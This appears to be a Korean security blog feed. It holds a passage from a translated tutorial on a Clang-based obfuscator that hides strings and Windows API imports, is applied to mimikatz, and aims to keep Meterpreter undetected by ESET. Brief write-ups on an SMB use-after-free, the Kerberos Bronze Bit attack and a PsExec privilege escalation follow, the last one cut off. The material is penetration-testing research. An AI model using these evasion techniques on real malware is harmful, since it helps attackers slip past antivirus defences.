   <span class="hljs-comment">// add LoadLibrary with obfuscated strings</span>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> LoadLibraryVariable = Utils::translateStringToIdentifier(_Library);    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> LoadLibraryString = Utils::generateVariableDeclaration(LoadLibraryVariable, _Library);    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> LoadLibraryHandleIdentifier = Utils::translateStringToIdentifier(<span class="hljs-string">&quot;hHandle_&quot;</span>+_Library);    Result &lt;&lt; <span class="hljs-string">&quot;\t&quot;</span> &lt;&lt; LoadLibraryString &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;    Result &lt;&lt; <span class="hljs-string">&quot;\tHANDLE &quot;</span> &lt;&lt; LoadLibraryHandleIdentifier &lt;&lt; <span class="hljs-string">&quot; = LoadLibrary(&quot;</span> &lt;&lt; LoadLibraryVariable &lt;&lt; <span class="hljs-string">&quot;);\n&quot;</span>;    <span class="hljs-comment">// add GetProcAddress with obfuscated string: TypeDef NewIdentifier = (TypeDef) GetProcAddress(handleIdentifier, ApiName)</span>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> ApiNameIdentifier = Utils::translateStringToIdentifier(ApiName);    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> ApiNameDecl = Utils::generateVariableDeclaration(ApiNameIdentifier, ApiName);    Result &lt;&lt; <span class="hljs-string">&quot;\t&quot;</span> &lt;&lt; ApiNameDecl &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;    Result &lt;&lt; <span class="hljs-string">&quot;\t_ &quot;</span>&lt;&lt; ApiName &lt;&lt; <span class="hljs-string">&quot; &quot;</span> &lt;&lt; NewIdentifier &lt;&lt; <span class="hljs-string">&quot; = (_&quot;</span> &lt;&lt; ApiName &lt;&lt; <span class="hljs-string">&quot;) GetProcAddress(&quot;</span>           &lt;&lt; LoadLibraryHandleIdentifier &lt;&lt; <span class="hljs-string">&quot;, &quot;</span> &lt;&lt; ApiNameIdentifier &lt;&lt; <span class="hljs-string">&quot;);\n&quot;</span>;    TypedefAdded.push_back(pCallExpression-&gt;getDirectCallee());    <span class="hljs-comment">// add everything at the beginning of the function.</span>    <span class="hljs-keyword">return</span> !(ASTRewriter-&gt;InsertText(EnclosingFunctionRange.getBegin(), Result.str()));&#125;</code></pre><h3 id="Test"><a href="#Test" class="headerlink" title="Test"></a>Test</h3><pre><code class="hljs cpp">git clone https:<span class="hljs-comment">//github.com/scrt/avcleaner</span>mkdir avcleaner/CMakeBuild &amp;&amp; cd avcleaner/CMakeBuildcmake ..makecd ..</code></pre><p>전부 잘 동작하는지 테스트하기 위해 아래 테스트 파일을 사용하자.</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>** argv)</span> </span>&#123;    MessageBoxA(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;Test&quot;</span>, <span class="hljs-string">&quot;Something&quot;</span>, MB_OK);    MessageBoxA(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;Another test&quot;</span>, <span class="hljs-string">&quot;Another something&quot;</span>, MB_OK);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>obfuscator 실행!</p><pre><code class="hljs cpp">./CMakeBuild/avcleaner.bin test/messagebox_simple.c --strings=<span class="hljs-literal">true</span> --api=<span class="hljs-literal">true</span> -- -D _WIN64 -D _UNICODE -D UNICODE -D _WINSOCK_DEPRECATED_NO_WARNINGS\ -I /usr/local/Cellar/llvm/<span class="hljs-number">9.0</span><span class="hljs-number">.1</span>\ -I /Users/vladimir/dev/scrt/avcleaner/Include/msvc<span class="hljs-number">-14.15</span><span class="hljs-number">.26726</span>-include\ -I /Users/vladimir/dev/scrt/avcleaner/Include/<span class="hljs-number">10.0</span><span class="hljs-number">.17134</span><span class="hljs-number">.0</span>/ucrt\ -I /Users/vladimir/dev/scrt/avcleaner/Include/<span class="hljs-number">10.0</span><span class="hljs-number">.17134</span><span class="hljs-number">.0</span>/shared\ -I /Users/vladimir/dev/scrt/avcleaner/Include/<span class="hljs-number">10.0</span><span class="hljs-number">.17134</span><span class="hljs-number">.0</span>/um\ -I /Users/vladimir/dev/scrt/avcleaner/Include/<span class="hljs-number">10.0</span><span class="hljs-number">.17134</span><span class="hljs-number">.0</span>/winrt -w -fdebug-compilation-dir -fno-use-cxa-atexit -fms-extensions -fms-compatibility -fms-compatibility-version=<span class="hljs-number">19.15</span><span class="hljs-number">.26726</span> -<span class="hljs-built_in">std</span>=c++<span class="hljs-number">14</span> -fdelayed-<span class="hljs-keyword">template</span>-parsing -fobjc-runtime=gcc -fcxx-exceptions -fexceptions -fdiagnostics-show-option -fcolor-diagnostics -x c++ -ferror-limit=<span class="hljs-number">1900</span> -target x86_64-pc-windows-msvc19<span class="hljs-number">.15</span><span class="hljs-number">.26726</span> -fsyntax-only -disable-<span class="hljs-built_in">free</span> -disable-llvm-verifier -discard-value-names -dwarf-column-info -debugger-tuning=gdb -momit-leaf-frame-pointer -v</code></pre><p>결과 확인!</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>** argv)</span> </span>&#123;        <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>  hid_Someth_lNGj92poubUG[] = &#123;<span class="hljs-string">&#x27;\x53&#x27;</span>,<span class="hljs-string">&#x27;\x6f&#x27;</span>,<span class="hljs-string">&#x27;\x6d&#x27;</span>,<span class="hljs-string">&#x27;\x65&#x27;</span>,<span class="hljs-string">&#x27;\x74&#x27;</span>,<span class="hljs-string">&#x27;\x68&#x27;</span>,<span class="hljs-string">&#x27;\x69&#x27;</span>,<span class="hljs-string">&#x27;\x6e&#x27;</span>,<span class="hljs-string">&#x27;\x67&#x27;</span>,<span class="hljs-number">0</span>&#125;;    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>  hid_Anothe_UP7KUo4Sa8LC[] = &#123;<span class="hljs-string">&#x27;\x41&#x27;</span>,<span class="hljs-string">&#x27;\x6e&#x27;</span>,<span class="hljs-string">&#x27;\x6f&#x27;</span>,<span class="hljs-string">&#x27;\x74&#x27;</span>,<span class="hljs-string">&#x27;\x68&#x27;</span>,<span class="hljs-string">&#x27;\x65&#x27;</span>,<span class="hljs-string">&#x27;\x72&#x27;</span>,<span class="hljs-string">&#x27;\x20&#x27;</span>,<span class="hljs-string">&#x27;\x74&#x27;</span>,<span class="hljs-string">&#x27;\x65&#x27;</span>,<span class="hljs-string">&#x27;\x73&#x27;</span>,<span class="hljs-string">&#x27;\x74&#x27;</span>,<span class="hljs-number">0</span>&#125;;    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>  hid_Anothe_ACsNhmIcS1tA[] = &#123;<span class="hljs-string">&#x27;\x41&#x27;</span>,<span class="hljs-string">&#x27;\x6e&#x27;</span>,<span class="hljs-string">&#x27;\x6f&#x27;</span>,<span class="hljs-string">&#x27;\x74&#x27;</span>,<span class="hljs-string">&#x27;\x68&#x27;</span>,<span class="hljs-string">&#x27;\x65&#x27;</span>,<span class="hljs-string">&#x27;\x72&#x27;</span>,<span class="hljs-string">&#x27;\x20&#x27;</span>,<span class="hljs-string">&#x27;\x73&#x27;</span>,<span class="hljs-string">&#x27;\x6f&#x27;</span>,<span class="hljs-string">&#x27;\x6d&#x27;</span>,<span class="hljs-string">&#x27;\x65&#x27;</span>,<span class="hljs-string">&#x27;\x74&#x27;</span>,<span class="hljs-string">&#x27;\x68&#x27;</span>,<span class="hljs-string">&#x27;\x69&#x27;</span>,<span class="hljs-string">&#x27;\x6e&#x27;</span>,<span class="hljs-string">&#x27;\x67&#x27;</span>,<span class="hljs-number">0</span>&#125;;    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">int</span> <span class="hljs-params">(*_MessageBoxA)</span><span class="hljs-params">(HWND hWnd, LPCTSTR lpText, LPCTSTR lpCaption, UINT uType)</span></span>;    TCHAR hid_User___Bhk5rL2239Kc[] = &#123;<span class="hljs-string">&#x27;\x55&#x27;</span>,<span class="hljs-string">&#x27;\x73&#x27;</span>,<span class="hljs-string">&#x27;\x65&#x27;</span>,<span class="hljs-string">&#x27;\x72&#x27;</span>,<span class="hljs-string">&#x27;\x33&#x27;</span>,<span class="hljs-string">&#x27;\x32&#x27;</span>,<span class="hljs-string">&#x27;\x2e&#x27;</span>,<span class="hljs-string">&#x27;\x64&#x27;</span>,<span class="hljs-string">&#x27;\x6c&#x27;</span>,<span class="hljs-string">&#x27;\x6c&#x27;</span>,<span class="hljs-number">0</span>&#125;;    HANDLE hid_hHandl_PFP2JD4HjR8w = LoadLibrary(hid_User___Bhk5rL2239Kc);    TCHAR hid_Messag_drqxgJLSrxfT[] = &#123;<span class="hljs-string">&#x27;\x4d&#x27;</span>,<span class="hljs-string">&#x27;\x65&#x27;</span>,<span class="hljs-string">&#x27;\x73&#x27;</span>,<span class="hljs-string">&#x27;\x73&#x27;</span>,<span class="hljs-string">&#x27;\x61&#x27;</span>,<span class="hljs-string">&#x27;\x67&#x27;</span>,<span class="hljs-string">&#x27;\x65&#x27;</span>,<span class="hljs-string">&#x27;\x42&#x27;</span>,<span class="hljs-string">&#x27;\x6f&#x27;</span>,<span class="hljs-string">&#x27;\x78&#x27;</span>,<span class="hljs-string">&#x27;\x41&#x27;</span>,<span class="hljs-number">0</span>&#125;;    _MessageBoxA hid_Messag_1W70P1kc8OJv = (_MessageBoxA) GetProcAddress(hid_hHandl_PFP2JD4HjR8w, hid_Messag_drqxgJLSrxfT);    TCHAR hid_User___EMmJBb201EuJ[] = &#123;<span class="hljs-string">&#x27;\x55&#x27;</span>,<span class="hljs-string">&#x27;\x73&#x27;</span>,<span class="hljs-string">&#x27;\x65&#x27;</span>,<span class="hljs-string">&#x27;\x72&#x27;</span>,<span class="hljs-string">&#x27;\x33&#x27;</span>,<span class="hljs-string">&#x27;\x32&#x27;</span>,<span class="hljs-string">&#x27;\x2e&#x27;</span>,<span class="hljs-string">&#x27;\x64&#x27;</span>,<span class="hljs-string">&#x27;\x6c&#x27;</span>,<span class="hljs-string">&#x27;\x6c&#x27;</span>,<span class="hljs-number">0</span>&#125;;    HANDLE hid_hHandl_vU1riOrVWM8g = LoadLibrary(hid_User___EMmJBb201EuJ);    TCHAR hid_Messag_GoaJMFscXsdw[] = &#123;<span class="hljs-string">&#x27;\x4d&#x27;</span>,<span class="hljs-string">&#x27;\x65&#x27;</span>,<span class="hljs-string">&#x27;\x73&#x27;</span>,<span class="hljs-string">&#x27;\x73&#x27;</span>,<span class="hljs-string">&#x27;\x61&#x27;</span>,<span class="hljs-string">&#x27;\x67&#x27;</span>,<span class="hljs-string">&#x27;\x65&#x27;</span>,<span class="hljs-string">&#x27;\x42&#x27;</span>,<span class="hljs-string">&#x27;\x6f&#x27;</span>,<span class="hljs-string">&#x27;\x78&#x27;</span>,<span class="hljs-string">&#x27;\x41&#x27;</span>,<span class="hljs-number">0</span>&#125;;    _MessageBoxA hid_Messag_6nzSLR0dttUn = (_MessageBoxA) GetProcAddress(hid_hHandl_vU1riOrVWM8g, hid_Messag_GoaJMFscXsdw);hid_Messag_1W70P1kc8OJv(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;Test&quot;</span>, hid_Someth_lNGj92poubUG, MB_OK);    hid_Messag_6nzSLR0dttUn(<span class="hljs-literal">NULL</span>, hid_Anothe_UP7KUo4Sa8LC, hid_Anothe_ACsNhmIcS1tA, MB_OK);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>볼 수 있듯이 문자열 난독화와 API 난독화 패스의 조합은 상당히 강력하다. <code>Test</code> 문자열은 작은 문자열은 무시하는 것으로 결정했기 때문에 남아있다. 그 후 난독화 소스 코드는 빌드할 수 있다.</p><pre><code class="hljs cpp">$ cp test/messagebox_simple.c.patch /tmp/test.c$ x86_64-w64-mingw32-gcc /tmp/test.c -o /tmp/toto.exe</code></pre><p>윈도우10 가상 머신에서 테스트 결과 원래 기능이 계속 작동하는 것으로 보인다. 더 중요한 것은 난독화된 바이너리에 <code>MessageBox</code> 문자열이 없다.</p><pre><code class="hljs cpp">$ rabin2 -zz /tmp/toto.exe | grep MessageBox | wc -l  <span class="hljs-number">0</span></code></pre><h3 id="Generalisation"><a href="#Generalisation" class="headerlink" title="Generalisation"></a>Generalisation</h3><p>안티바이러스 ESET Nod32 관련해서 우리는 <code>samlib.dll</code>과 관련된 API imports 중 특히 아래에 있는 API들을 숨기는 것이 중요하다는 것을 발견했다.</p><ul><li>SamConnect</li><li>SamConnectWithCreds</li><li>SamEnumerateDomainInSamServer</li><li>SamLookupDomainInSamServer</li><li>SamOpenDomain</li><li>SamOpenUser</li><li>SamOpenGroup</li><li>SamOpenAlias</li><li>SamQueryInformationUser</li><li>SamSetInformationUser</li><li>SamiChangePasswordUser</li><li>SamGetGroupsForUser</li><li>SamGetAliasMembership</li><li>SamGetMembersInGroup</li><li>SamGetMembersInAlias</li><li>SamEnumerateUsersInDomain</li><li>SamEnumerateGroupsInDomain</li><li>SamEnumerateAliasesInDomain</li><li>SamLookupNamesInDomain</li><li>SamLookupIdsInDomain</li><li>SamRidToSid</li><li>SamCloseHandle</li><li>SamFreeMemory</li></ul><p>이러한 함수들은 AV 엔진 어디에서도 블랙리스트에 있지 않지만 내부 탐지 신뢰 점수를 높인다. 이러한 함수에 <code>ApiCallConsumer</code>를 등록해야 하므로 이름과 함수 프로토타입이 필요하다.</p><pre><code class="hljs cpp"><span class="hljs-keyword">static</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">map</span>&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>, <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>&gt; ApiToHide_samlib = &#123;    &#123;<span class="hljs-string">&quot;SamConnect&quot;</span>,                     <span class="hljs-string">&quot;typedef NTSTATUS (__stdcall* _SamEnumerateDomainsInSamServer)(SAMPR_HANDLE ServerHandle, DWORD * EnumerationContext, PSAMPR_RID_ENUMERATION* Buffer, DWORD PreferedMaximumLength,DWORD * CountReturned);&quot;</span>&#125;,    &#123;<span class="hljs-string">&quot;SamConnectWithCreds&quot;</span>,            <span class="hljs-string">&quot;typedef NTSTATUS(__stdcall* _SamConnect)(PUNICODE_STRING ServerName, SAMPR_HANDLE * ServerHandle, ACCESS_MASK DesiredAccess, BOOLEAN Trusted);&quot;</span>&#125;,    &#123;<span class="hljs-string">&quot;SamEnumerateDomainsInSamServer&quot;</span>, <span class="hljs-string">&quot;typedef NTSTATUS(__stdcall* _SamConnectWithCreds)(PUNICODE_STRING ServerName, SAMPR_HANDLE * ServerHandle, ACCESS_MASK DesiredAccess, LSA_OBJECT_ATTRIBUTES * ObjectAttributes, RPC_AUTH_IDENTITY_HANDLE AuthIdentity, PWSTR ServerPrincName, ULONG * unk0);&quot;</span>&#125;,    ...&#125;</code></pre><p>그 후 이러한 컬렉션을 반복하고 각 컬렉션을 처리하기 위해 <code>main.cpp</code>를 업데이트한다.</p><pre><code class="hljs cpp"><span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span> <span class="hljs-keyword">const</span>&amp; el: ApiToHide_samlib)&#123;    <span class="hljs-keyword">auto</span> Cons = <span class="hljs-built_in">std</span>::make_unique&lt;ApiCallConsumer*&gt;(<span class="hljs-keyword">new</span> ApiCallConsumer(el.first, el.second,                                                                        <span class="hljs-string">&quot;samlib.dll&quot;</span>));    consumers.push_back(*Cons);&#125;</code></pre><p>여기서 <code>std::make_unique</code>는 이 반복문에서 힙에 있는 객체를 인스턴스화할 수 있기에 중요하고 나중에 이러한 객체를 수동으로 쉽게 해제할 수 있다. 이것은 더 이상 사용하지 않을 때 자동으로 해제될 것이다.</p><p>마지막으로 mimikatz, 특히 <code>kuhl_m_lsadump.c</code>로 난독화를 테스트할 수 있다.</p><pre><code class="hljs bash">bash run_example_mimikatz.sh <span class="hljs-built_in">test</span>/kuhl_m_lsadump.c</code></pre><p>이것은 흥미로운 결과를 만든다.</p><p><img src="/2020/12/13/idioth/av_evasion_part2/5.png"></p><p><code>samlib.dll</code>에서 가져온 API를 위한 Run-time dynamic linking</p><p>실제 함수 호출은 완벽하게 수정되었다.</p><p><img src="/2020/12/13/idioth/av_evasion_part2/6.png"></p><p><code>samlib.dll</code>에서 가져온 함수 호출들은 완벽하게 수정되었다.</p><p><code>PRINT_ERROR</code> 매크로 내부의 문자열은 <code>do&#123;&#125;while(0)</code>을 통해 매크로를 사용하여 난독화 되지 않았다. obfuscator의 버그를 찾는데 <code>mimikatz</code>보다 좋은 프로젝트를 찾기 못했다.</p><h2 id="개선사항"><a href="#개선사항" class="headerlink" title="개선사항"></a>개선사항</h2><p>이 부분은 여러분을 위해 남겨진 작업들이다 🙂</p><h3 id="More-stealth"><a href="#More-stealth" class="headerlink" title="More stealth"></a>More stealth</h3><p>run-time dynamic linking을 수행하기 위해 실제로 API <code>LoadLibrary/GetProcAddress</code>가 필요하지 않다.</p><p>후킹을 피하기 위해 이 함수들은 재구현하는 것이 좋고 이미 그것을 할 수 있는 오픈소스 프로젝트가 있다.(<a href="https://github.com/rapid7/ReflectiveDLLInjection/">ReflectiveDllInjection</a>)</p><p>여기까지 읽었다면, translation unit의 상단에 이러한 함수들을 위한 구현을 추가하고(<code>findInjectionSpot</code> 사용) WinAPI 대신에 구현을 사용하기 위해 메소드 <code>addGetProcAddress</code>를 업데이트하면 된다는 것을 알 것이다.</p><h3 id="Error-handling"><a href="#Error-handling" class="headerlink" title="Error handling"></a>Error handling</h3><ul><li><code>LoadLibrary</code>는 성공적으로 수행되지 않을 경우 <code>NULL</code>을 반환하므로 이에 대한 검사를 추가하여 오류를 정상적으로 복구할 수 있다. 현재 상황에서 크래시가 매우 잘 날 수도 있다.</li><li><code>GetProcAddress</code>도 오류가 발생하면 <code>NULL</code>을 반환하므로 이것도 확인하는 것이 중요하다.</li></ul><h2 id="결론"><a href="#결론" class="headerlink" title="결론"></a>결론</h2><p>이 글에서 우리는 정규식을 사용하지 않고 C/C++ 코드 베이스에서 함수 호출을 정확하게 교체할 수 있는 방법을 보여줬다. 모든 것은 안티바이러스 소프트웨어가 우리가 pentest를 하는 동안 사용하는 Meterpreter나 다른 소프트웨어에 관해 행동 정보를 정적으로 수집하는 것을 막기 위해 진행되었다.</p><p>ESET Nod32에 적용된 이 작업은 모든 Meterpreter 모듈이 탐지되지 않도록 하는 주요 단계였고 더 발전된 제품에 도움이 되었다.</p><p>API imports를 숨기는 것도 하나지만 악성코드가 실행되면 보안 소프트웨어가 API 호출 모니터링에 의해 행동 정보를 수집하는 방법도 있다.</p><p>그런 관점에서 다음 글은 의심스러운 Win32 API가 직접적인 syscalls을 하도록 자동적으로 refactoring 하는 것이다. 이것은 Cylance, Traps과 Kaspersky 같은 AV의 userland hook을 통한 런타임 탐지 우회의 핵심 단계이다.</p><h2 id="출처"><a href="#출처" class="headerlink" title="출처"></a>출처</h2><p>[1] The Rootkit Arsenal, Chapter 11, p.480.</p><p>[2]<a href="https://devblogs.microsoft.com/cppblog/exploring-clang-tooling-part-2-examining-the-clang-ast-with-clang-query/">https://devblogs.microsoft.com/cppblog/exploring-clang-tooling-part-2-examining-the-clang-ast-with-clang-query/</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Translation/">Translation</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
      
      <category domain="https://hackyboiz.github.io/tags/bypass/">bypass</category>
      
      <category domain="https://hackyboiz.github.io/tags/evasion/">evasion</category>
      
      <category domain="https://hackyboiz.github.io/tags/meterpreter/">meterpreter</category>
      
      <category domain="https://hackyboiz.github.io/tags/obfuscation/">obfuscation</category>
      
      <category domain="https://hackyboiz.github.io/tags/iat/">iat</category>
      
      
      <comments>https://hackyboiz.github.io/2020/12/13/idioth/av_evasion_part2/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2020-17140 : SMB uaf to info disclosure</title>
      <link>https://hackyboiz.github.io/2020/12/12/fabu1ous/2020-12-12/</link>
      <guid>https://hackyboiz.github.io/2020/12/12/fabu1ous/2020-12-12/</guid>
      <pubDate>Sat, 12 Dec 2020 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://blogs.360.cn/post/CVE-2020-17140-Analysis.html&quot;&gt;W</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blogs.360.cn/post/CVE-2020-17140-Analysis.html">Windows SMB Information Disclousure Analysis</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Windows 7 ~ Windows 10</p><p>svr2.sys 드라이버</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>patch Tuesday(2020.12.08)에서 CVE-2020-17140가 패치되어 Write-up이 공개되었습니다. CVE-2020-17140은 <code>SMB2_SET_INFO</code> 패킷의 처리 로직에서 발생하는 use after free로 커널 메모리를 노출시키는 취약점입니다.</p><p>SMBv2 이후부터 LEASE라는 새로운 caching mechanism이 도입되었고 클라이언트는 <code>SMB2_CREATE_REQEUST_LEASE_V2</code> 패킷을 보내 공유 파일에 lease를 생성하고, <code>SMB2_SET_INFO</code> 패킷을 보내 공유 파일의 lease를 수정할 수 있습니다.</p><p>srv2.sys 드라이버는 SMB2_SET_INFO 패킷을 받으면 <code>srv2!Smb2UpdateLeaseFileName</code>를 호출해서 lease 이름을 수정하는데, new lease name이 기존의 old lease name보다 길 경우 새로운 메모리(newFileBuf)를 할당해 old lease name을 백업합니다.</p><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( *(_BYTE *)(v6 + <span class="hljs-number">114</span>) )ExFreePoolWithTag(oldFileBuf, <span class="hljs-number">0</span>);<span class="hljs-keyword">if</span> ( v11 )memmove(newFileBuf, oldFileBuf, <span class="hljs-number">2</span>i64 * v11);</code></pre><p>old lease name을 담고 있던 oldFileBuf를 할당 해제한 후에 newFileBuf에 복사하기 때문에 use after free가 발생합니다. oldFileBuf를 해제한 후 댕글링 포인터의 상태에 따라 kernel info leak 또는 BSoD로 이어질 수 있습니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/kernel/">kernel</category>
      
      <category domain="https://hackyboiz.github.io/tags/use-after-free/">use after free</category>
      
      <category domain="https://hackyboiz.github.io/tags/smb/">smb</category>
      
      <category domain="https://hackyboiz.github.io/tags/info-leak/">info leak</category>
      
      <category domain="https://hackyboiz.github.io/tags/bsod/">bsod</category>
      
      
      <comments>https://hackyboiz.github.io/2020/12/12/fabu1ous/2020-12-12/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2020-17049: Kerberos Bronze Bit Attack</title>
      <link>https://hackyboiz.github.io/2020/12/11/l0ch/2020-12-11/</link>
      <guid>https://hackyboiz.github.io/2020/12/11/l0ch/2020-12-11/</guid>
      <pubDate>Fri, 11 Dec 2020 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bi</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-attack/">CVE-2020-17049: Kerberos Bronze Bit Attack – Practical Exploitation</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>standard Windows versions since 2000</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Kerberos는 Windows Active Directory 도메인 내에서 사용자, 서버 및 기타 리소스를 서로 인증하는 데 사용되는 프로토콜입니다.<br>Kerberos의 기존 공격 방법인 Golden Ticket 및 Silver Ticket 공격의 변형인 Bronze Bit 공격이 공개되었습니다.</p><blockquote><p>Golden/Silver Ticket 공격<br>내부 네트워크에 침입한 이후 동일한 네트워크의 Kerberos 인증시스템을 사용하는 다른 시스템의 자격 증명을 위조하는 공격기법</p></blockquote><br><p>Bronze Bit는 Microsoft가 Kerberos 프로토콜에 추가 한 <code>S4U2self</code> 및 <code>S4U2proxy</code> 프로토콜을 악용하며 Kerberos 프로세스가 변조된 서비스 티켓을 감지할 수 없어 발생합니다. 공격을 위해서는 다음 조건이 만족되어야 합니다.</p><ol><li>해커는 내부 네트워크의 시스템 하나(Service1)를 장악해 Active Directory 내에 접근 권한이 있어야 합니다.</li><li>침입한 시스템인 Service1에 대한 암호 해시가 필요합니다.</li><li>Service1에는 다른 시스템(Service2)에 대한 제한된 신뢰 관계가 있습니다.</li></ol><p>위 조건이 만족되면 해커는 다음과 같은 공격이 가능합니다.</p><ol><li>사용자를 식별하고 티켓을 반환하는 <code>S4U2self</code> 에서 User2의 Service1 서비스 티켓을 가져옵니다. 이때 <code>force-forwardable</code> 옵션을 사용하면 반환하는 서비스 티켓이 전달 가능한 티켓으로 변환됩니다.</li><li>Service1의 해시로 티켓을 복호화하고 플래그 값의 두 번째 비트를 0→1 로 변경한 뒤 다시 암호화합니다. </li><li>조작된 티켓은 <code>S4U2proxy</code> 에서 전송되고 Service2에 대한 서비스 티켓이 User2로 반환되어 <code>User2.ccache</code>의 디스크에 기록됩니다.</li><li>해커는 Service1 유저(User1) 권한으로 Service2 유저(User2)의 Kerberos 서비스 티켓을 얻을 수 있어 User2 권한으로 Service2에 액세스가 가능합니다.</li></ol><p>이는 Golden/Silver Ticket과 유사한 공격 방법이지만 단일 비트 플립을 이용했기 때문에 Bronze Bit로 명명되었습니다.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-theory/">https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-theory/</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/kerberos/">kerberos</category>
      
      <category domain="https://hackyboiz.github.io/tags/bronze-bit/">bronze bit</category>
      
      
      <comments>https://hackyboiz.github.io/2020/12/11/l0ch/2020-12-11/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] PsExec Local Privilege Escalation</title>
      <link>https://hackyboiz.github.io/2020/12/10/idioth/2020-12-10/</link>
      <guid>https://hackyboiz.github.io/2020/12/10/idioth/2020-12-10/</guid>
      <pubDate>Thu, 10 Dec 2020 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://medium.com/tenable-techblog/psexec-local-privileg</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://medium.com/tenable-techblog/psexec-local-privilege-escalation-2e8069adc9c8">PsExec Local Privilege Escalation</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>PsExec v2.2 all the way back to v1.72 (2006)</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><blockquote><p>아직 패치되지 않은 취약점입니다.</p></blockquote><p>SysInternals Suite에서 원격으로 애플리케이션을 실행할 수 있는 PsExec에서 Local Privilege Escalation 취약점이 발견됐습니다. 해당 취약점은 글을 작성한 시점의 버전인 PsExec v2.2까지 영향을 미치며 아직 패치되지 않았습니다.</p><p>PsExec 클라이언트와 원격 PSEXESVC 서비스는 named pipe를 통해 통신합니다. 그 중 <code>\\PSEXESVC</code> 파이프는 실행할 응용 프로그램, 명령줄 데이터 등 PsExec 클라이언트의 명령을 분석하여 실행하는 역할을 합니다. <code>\\PSEXESVC</code> 파이프는 Administrator만 read/write 권한을 가져 권한이 낮은 사용자가 파이프에 read\write 하는 것을 막습니다.</p><p>하지만 PSEXESVC가 <code>\\PSEXESVC</code> 파이프를 생성할 때 파이프가 이미 존재할 경우 해당 <code>\\PSEXESVC</code> 파이프의 handle을 가져옵니다. 따라서 낮은 권한의 애플리케이션이 PSEXESVC가 실행되기 전에 <code>\\PSEXESVC</code> 파이프를 생성하면 PSEXESVC는 자신이 생성한 파이프가 아닌 이미 존재하는 파이프의 handle을 가져옵니다. 